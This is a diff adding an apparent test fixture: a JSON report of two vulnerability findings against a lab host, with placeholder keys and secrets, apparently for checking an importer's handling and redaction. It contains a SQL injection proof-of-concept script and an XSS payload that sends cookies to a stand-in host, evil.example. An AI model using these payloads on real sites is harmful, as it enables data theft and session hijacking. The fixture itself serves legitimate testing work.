@@ -1,0 +1,36 @@
+{
+  "summary": {
+    "count": 99,
+    "critical": 12
+  },
+  "vulnerabilities": [
+    {
+      "id": "vuln-a3f8b2e1",
+      "timestamp": "2026-09-17T14:01:00.000Z",
+      "title": "SQL Injection in Search Endpoint",
+      "severity": "critical",
+      "cvss": 9.8,
+      "target": "https://lab.example.test",
+      "endpoint": "/api/search",
+      "method": "GET",
+      "description": "The search parameter is vulnerable to SQL injection.",
+      "poc_script_code": "import requests\npayload = \"' OR '1'='1\"\nrequests.get('https://lab.example.test/api/search', params={'q': payload, 'key': 'AKIAIOSFODNN7EXAMPLE'})",
+      "technical_analysis": "-----BEGIN RSA PRIVATE KEY-----\nfixture\n-----END RSA PRIVATE KEY-----",
+      "cve": "CVE-2024-12345",
+      "cwe": "CWE-89",
+      "hashed_secret": "hashed_secret_should_not_leak"
+    },
+    {
+      "id": "vuln-c91d04aa",
+      "timestamp": "2026-09-17T14:02:00.000Z",
+      "title": "Stored XSS in profile bio",
+      "severity": "high",
+      "target": "https://lab.example.test",
+      "endpoint": "/profile",
+      "method": "POST",
+      "cwe": "CWE-79",
+      "poc_script_code": "document.location='https://evil.example/?c='+document.cookie",
+      "impact": "Session cookie theft is out of scope for this import."
+    }
+  ]
+}
